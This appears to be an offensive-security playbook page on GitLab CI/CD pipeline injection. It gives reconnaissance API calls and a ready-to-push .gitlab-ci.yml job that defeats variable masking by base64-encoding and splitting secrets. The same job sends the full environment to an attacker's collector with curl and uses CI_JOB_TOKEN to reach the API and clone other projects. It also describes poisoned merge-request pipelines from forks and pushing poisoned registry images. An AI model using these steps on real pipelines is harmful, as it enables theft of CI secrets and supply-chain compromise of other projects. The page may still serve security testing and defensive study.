---
title: "CI/CD pipeline injection"
order: 2
description: "Running attacker-controlled script in a GitLab pipeline by pushing a branch or opening a merge request, exfiltrating protected and masked CI/CD variables, and pivoting with the CI_JOB_TOKEN to the API, registry, and other projects on the job-token allowlist."
keywords:
  - gitlab-ci.yml
  - pipeline injection
  - protected variable
  - masked variable
  - CI_JOB_TOKEN
  - merge request pipeline
---

# CI/CD pipeline injection

A GitLab pipeline is defined by `.gitlab-ci.yml` in the repository. When a pipeline runs, each job's `script:` executes on a runner with the project's and group's CI/CD variables present in the environment and a `CI_JOB_TOKEN` minted for that job. So if you can cause a pipeline to run code you wrote, you execute with those secrets in reach. The two ways in are **pushing to a branch** whose pipeline runs, and **opening a merge request** whose MR pipeline runs the source branch's `.gitlab-ci.yml`.

## Preconditions

- **Developer or above** on the project (push a branch), or the project accepts MRs from your fork with pipelines enabled.
- Pipelines enabled (`builds_access_level` not `disabled`), which you confirm from the project API.
- Knowing which variables are **protected**: protected variables are exposed only to jobs running on **protected branches or tags**. An unprotected branch you push sees only unprotected variables. To reach protected ones you either push to a protected branch (if your role allows), get your branch marked protected, or target a tag pipeline on a protected tag.

```bash
curl -s "https://gitlab.com/api/v4/projects/<id>" -H "PRIVATE-TOKEN: $TOKEN" \
  | jq '{builds: .builds_access_level, default: .default_branch}'
curl -s "https://gitlab.com/api/v4/projects/<id>/protected_branches" -H "PRIVATE-TOKEN: $TOKEN"
```

## Worked job: exfiltrate variables and pivot with the job token

Push this `.gitlab-ci.yml` to a branch you control. `masked: true` only prevents GitLab from printing the literal value in the log, so splitting or base64-encoding the value defeats masking; the runner still has the clear value in the environment.

```yaml
exfil:
  stage: build
  script:
    # Masked variables are hidden only as an exact substring in the log.
    # base64 changes the surface form, so the value slips past the masker.
    - echo "$SECRET" | base64 -w0
    # Or chunk it so no masked substring appears intact
    - echo "${SECRET:0:4} ${SECRET:4}"
    # Dump the whole environment out of band rather than to the log
    - env | base64 -w0 | curl -s --data-binary @- https://<your-collector>/e
    # The job token reaches the API as the triggering user's job identity
    - 'curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/$CI_PROJECT_ID"'
    # Clone another project IF this project is on that project's job-token allowlist
    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/<other-ns>/<other-project>.git
```

Interpreting the run: the `base64` line appears in the job log as an unbroken base64 blob you decode offline to recover `$SECRET` even though it was masked. The `env` line ships every variable, protected ones included if the job ran on a protected branch, to your collector in one request so nothing sensitive is left in the log. The final `git clone` succeeds only when the target project lists this project in its **CI/CD job token allowlist** (`Settings > CI/CD > Token Access`); a `403`/`fatal: Authentication failed` there means the target is not on the allowlist.

## Variants and follow-on

- **MR pipeline from a fork**: open a merge request whose source branch carries your edited `.gitlab-ci.yml`; for many public projects the MR pipeline runs in the target project's context. This is the classic poisoned-pipeline path when you are not a member.
- **`include:` and trigger jobs**: if the config pulls a remote template with `include: { remote: ... }` or triggers a child pipeline, controlling the included file or the downstream project's config injects script indirectly.
- **`CI_JOB_TOKEN` reach**: the token authenticates to the package and container registry, the generic API for allowlisted projects, and release endpoints, so a job on a low-value project can push a poisoned image or clone a high-value one if the allowlist permits.
- Variables and the job token feed [token abuse](token-abuse.md); the runner itself is the target in [runner takeover](runner-takeover.md).

## Tools

- **glab** to push branches and trigger pipelines with a stored token.
- A request collector (an HTTP listener you control) for out-of-band environment exfiltration.

## References

- [GitLab: protected CI/CD variables](https://docs.gitlab.com/ee/ci/variables/#protect-a-cicd-variable)
- [GitLab: CI/CD job token and its allowlist](https://docs.gitlab.com/ee/ci/jobs/ci_job_token.html)
- [GitLab: masked variables](https://docs.gitlab.com/ee/ci/variables/#mask-a-cicd-variable)
- [OWASP Top 10 CI/CD Security Risks: Poisoned Pipeline Execution](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
